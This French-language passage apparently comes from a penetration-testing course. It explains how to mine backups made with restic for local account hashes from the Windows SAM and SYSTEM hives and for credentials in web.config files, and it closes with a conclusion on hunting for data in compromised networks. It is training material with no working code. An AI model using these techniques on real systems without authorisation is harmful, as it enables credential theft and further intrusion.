Si nous ciblons une sauvegarde Windows, nous pouvons rechercher la ruche SAM & SYSTEM pour extraire les hachages de compte local. Nous pouvons également identifier les répertoires d'applications Web et les fichiers communs où les informations d'identification or des informations sensibles sont stockées, telles que les fichiers web.config. Notre objectif est de rechercher tous les fichiers intéressants qui peuvent nous aider à archiver notre objectif.

Remarque : restic fonctionne de la même manière sous Linux. Si nous ne savons pas où les instantanés restic sont enregistrés, nous pouvons rechercher dans le système de fichiers un répertoire nommé snapshots. Gardez à l'esprit que la variable d'environnement peut ne pas être définie. Si tel est le cas, nous devrons fournir un mot de passe pour restaurer les fichiers.

Des centaines d'applications et de méthodes existent pour effectuer des sauvegardes, et nous ne pouvons pas détailler chacune. Ce cas `restic` est un exemple de la façon dont une application de sauvegarde pourrait fonctionner. D'autres systèmes géreront une console centralisée et des référentiels spéciaux pour enregistrer les informations de sauvegarde et exécuter les tâches de sauvegarde.

Au fur et à mesure que nous avançons, nous trouverons différents systèmes de sauvegarde, et nous vous recommandons de prendre le temps de comprendre leur fonctionnement afin de pouvoir éventuellement abuser de leurs fonctions à nos fins.

* * * * *

Conclusion
----------

Il existe encore de nombreux emplacements, applications et méthodes pour obtenir des informations intéressantes d'un hôte ciblé ou d'un réseau compromis. Nous pouvons trouver des informations dans les services cloud, les appareils réseau, l'IoT, etc. Soyez ouvert et créatif pour explorer votre cible et votre réseau et obtenir les informations dont vous avez besoin en utilisant vos méthodes et votre expérience.